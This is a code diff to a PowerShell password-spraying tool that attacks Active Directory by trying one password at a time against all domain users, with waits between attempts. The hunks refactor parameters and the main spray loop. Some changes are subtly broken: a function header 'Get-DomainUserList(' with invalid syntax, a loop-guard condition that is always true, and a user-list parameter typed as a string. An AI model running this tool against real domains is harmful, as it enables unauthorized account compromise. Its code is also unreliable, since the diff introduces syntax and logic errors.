@@ -61,7 +61,6 @@ function Invoke-DomainPasswordSpray{
 
     #>
     param(
-
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
      $UserList = "",
@@ -82,11 +81,11 @@ function Invoke-DomainPasswordSpray{
      [string]
      $Filter = "",
 
-     [Parameter(Position = 4, Mandatory = $false)]
+     [Parameter(Position = 5, Mandatory = $false)]
      [string]
      $Domain = "",
 
-     [Parameter(Position = 5, Mandatory = $false)]
+     [Parameter(Position = 6, Mandatory = $false)]
      [switch]
      $Force
     )
@@ -183,10 +182,13 @@ function Invoke-DomainPasswordSpray{
     Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
     Write-Host "[*] This might take a while depending on the total number of users"
 
-    foreach($Password_Item in $Passwords)
+    for($i = 0; $i -lt $Passwords.count; $i++)
     {
-        Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password_Item)
-        Countdown-Timer -Seconds (60*$observation_window)
+        Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Passwords[$i])
+        if ($i -lt $Passwords.count)
+        {
+            Countdown-Timer -Seconds (60*$observation_window)
+        }
     }
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
@@ -209,8 +211,8 @@ function Countdown-Timer
     Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
 
-function Get-DomainUserList{
-
+function Get-DomainUserList(
+{
 <#
     .SYNOPSIS
 
@@ -429,8 +431,19 @@ function Get-DomainUserList{
     return $UserListArray
 }
 
-function Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password)
+function Invoke-SpraySinglePassword
 {
+    param(
+            [Parameter(Position=1)]
+            [string]
+            $CurrentDomain,
+            [Parameter(Position=2)]
+            [string]
+            $UserListArray,
+            [Parameter(Position=3)]
+            [string]
+            $Password
+    )
     $time = Get-Date
     $count = $UserListArray.count
     Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
